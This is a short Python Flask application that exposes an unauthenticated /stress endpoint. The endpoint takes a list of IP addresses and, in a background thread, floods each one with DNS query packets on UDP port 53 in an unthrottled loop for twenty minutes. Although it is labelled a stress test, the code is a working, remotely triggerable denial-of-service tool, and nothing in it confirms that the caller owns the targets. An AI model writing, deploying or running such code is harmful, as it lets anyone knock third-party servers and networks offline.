from flask import Flask, request, jsonify
import socket
import time
import threading

app = Flask(__name__)

def send_dns_packets(ips, duration_seconds=1200):
    transaction_id = b'\x00\x01'
    dns_payload = transaction_id + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    for label in b"example.com".split(b"."):
        dns_payload += bytes([len(label)]) + label
    dns_payload += b"\x00\x00\x01\x00\x01"
    end_time = time.time() + duration_seconds
    port = 53
    sockets = {}
    for ip in ips:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sockets[ip] = s
        except:
            continue
    while time.time() < end_time:
        for ip, s in sockets.items():
            try:
                s.sendto(dns_payload, (ip, port))
            except:
                pass
    for s in sockets.values():
        s.close()

@app.route('/stress', methods=['POST'])
def stress():
    data = request.get_json()
    if not data or 'ips' not in data or not isinstance(data['ips'], list):
        return jsonify({'status': 'error', 'message': 'Invalid input'}), 400
    ips = [ip for ip in data['ips'] if validate_ip(ip)]
    if not ips:
        return jsonify({'status': 'error', 'message': 'No valid IPs provided'}), 400
    thread = threading.Thread(target=send_dns_packets, args=(ips,))
    thread.daemon = True
    thread.start()
    return jsonify({'status': 'success', 'message': 'Stress test started', 'targets': ips})

@app.route('/stress', methods=['GET'])
def stress_get():
    return jsonify({'status': 'error', 'message': 'Method GET not allowed'}), 405

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except:
        return False

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
